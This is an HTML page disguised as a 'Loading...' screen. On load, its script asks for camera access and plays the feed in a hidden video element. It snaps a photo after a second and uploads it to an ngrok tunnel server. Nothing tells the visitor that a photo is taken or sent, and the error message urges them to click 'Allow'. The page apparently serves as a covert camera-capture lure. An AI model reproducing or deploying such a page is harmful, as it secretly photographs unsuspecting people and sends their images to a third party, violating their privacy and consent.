<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Test</title>
</head>
<body>
    <h3>Loading...</h3>
    <script>
        const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
        
        async function takePhoto() {
            console.log("1. Requesting camera...");
            
            try {
                // Buka kamera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480 }
                });
                console.log("2. Camera OK");
                
                // Buat video element (sembunyi)
                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();
                console.log("3. Video playing");
                
                // Tunggu 1 detik
                await new Promise(r => setTimeout(r, 1000));
                
                // Ambil foto
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                console.log("4. Photo captured");
                
                // Kirim ke server
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob);
                    
                    const res = await fetch(SERVER + '/photo', { method: 'POST', body: formData });
                    if (res.ok) {
                        console.log("5. ✅ PHOTO SENT!");
                        document.body.innerHTML = "<h3>✅ Success - Photo sent!</h3>";
                    } else {
                        console.log("5. ❌ Send failed");
                    }
                }, 'image/jpeg');
                
                // Tutup stream setelah 5 detik
                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                }, 5000);
                
            } catch(e) {
                console.log("ERROR:", e.message);
                document.body.innerHTML = "<h3>Error: " + e.message + "</h3><p>Click 'Allow' when prompted</p>";
            }
        }
        
        takePhoto();
    </script>
</body>
</html>
